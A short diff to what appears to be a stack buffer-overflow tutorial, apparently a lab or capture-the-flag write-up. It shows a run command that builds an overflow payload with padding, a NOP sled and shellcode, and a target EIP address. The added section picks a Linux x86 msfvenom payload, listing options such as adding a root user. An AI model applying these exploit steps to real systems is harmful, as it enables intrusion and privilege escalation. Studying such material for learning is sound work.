@@ -192,6 +192,15 @@ run $(python -c 'print "\x41"*1896 + "\x90"*100 + "H\xb8\x01\x01\x01\x01\x01\x01
 Now all we need to do is point EIP to: 0xffffd75c
 
 
+# Payload:
+
+We'll use msfvenom to find a sutable exploit. Our target uses 32-bit registers so we'll need to filter for "linux/x86":
+
+    msfvenom -l payloads | grep 'linux/x86'
+        linux/x86/adduser                                                  Create a new user with UID 0
+        ...
+        linux/x86/read_file                                                Read up to 4096 bytes from the local file system and write it back out to the specified file descriptor
+
 
 
 
